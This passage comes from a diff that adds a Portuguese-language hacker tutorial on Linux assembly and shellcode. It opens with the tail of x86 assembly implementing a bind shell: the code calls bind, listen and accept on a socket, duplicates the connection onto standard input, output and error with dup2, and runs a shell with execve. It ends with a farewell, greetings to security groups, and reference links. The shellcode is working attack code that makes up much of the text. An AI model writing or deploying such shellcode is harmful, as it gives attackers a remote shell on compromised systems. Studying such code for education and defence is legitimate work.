+	movl	%ebx,0x4(%esp)
+	movl	$0x10,0x8(%esp)
+	movl	$SYS_socketcall,%eax
+	movl	$SYS_socketcall_bind,%ebx
+	int 	$0x80
+
+	movl	SOCK,%eax	
+
+	# listen(%eax, 0x1);
+	movl	%eax,(%esp)
+	movl	$0x1,0x4(%esp)
+	movl	$SYS_socketcall,%eax
+	movl	$SYS_socketcall_listen,%ebx
+	int 	$0x80
+
+	movl	SOCK,%eax
+
+	# accept(%eax, %esp+0xc, LEN);
+	movl	%eax,(%esp)
+	leal	0xc(%esp),%ebx
+	movl	%ebx,0x4(%esp)
+	movl	$LEN,0x8(%esp)
+	movl	$SYS_socketcall,%eax
+	movl	$SYS_socketcall_accept,%ebx
+	int	$0x80
+
+	# for(i=2;i>-1;;i--) dup2(%eax,i)
+	movl	$0x2,%ecx
+DUP2LOOP:
+	pushl	%eax
+	movl	%eax,%ebx
+	movl	$SYS_dup2,%eax
+	int	$0x80
+	dec	%ecx
+	popl	%eax
+	jns	DUP2LOOP
+
+	# execve(SHELL, { SHELL, NULL }, NULL );
+	movl	$SYS_execve,%eax
+	movl	$SHELL,%ebx
+	movl	%ebx,(%esp)
+	movl	%edx,0x4(%esp)
+	movl	%esp,%ecx
+	int	$0x80
+
+	# exit(0)
+	movl	$SYS_exit,%eax
+	movl	%edx,%ebx
+	int	$0x80
+
+	ret
+
+----cut----
+
+E' isso ae ;)
+
+
+
+[ --- 3. Terminando
+
+So' existe uma forma de aprender realmente, codar, codar e codar, e com base
+nesse paper e nos exemplos, muitos outro codes podem ser criados.
+
+Bem pessoal, espero ter esclarecido algo na mente de voces, existe muito a ser
+dito e espero ter outra oportunidade ;)
+
+Um forte abraco e meus agradecimentos ao pessoal da:
+
++     rfdslabs <www.rfdslabs.com.br>
++     The Bug! Magazine <http://www.thebugmagazine.org>
++     Gotfault <http://gotfault.net>
+
+
+Mais informacoes sobre Assembly:
+
++     http://www.linuxassembly.org/
++     http://www.nlabs.com.br/~hophet/docs/assembly_em_linux.txt
+
+
+Mais informacoes sobre Race Conditions:
+
++     http://www.nlabs.com.br/~hophet/docs/racecond_fd.txt
++     http://www.nlabs.com.br/~hophet/docs/racecond_suid.txt
+
+
+Mais informacoes sobre Shellcodes:
+
++     http://guide.motdlabs.org/edicoes/guide01/shellcode.txt
++     http://guide.motdlabs.org/edicoes/guide02/shellsemsegredos.txt
+
+
+Um forte abraco a todos. See you later!!! =]
+
+hophet.
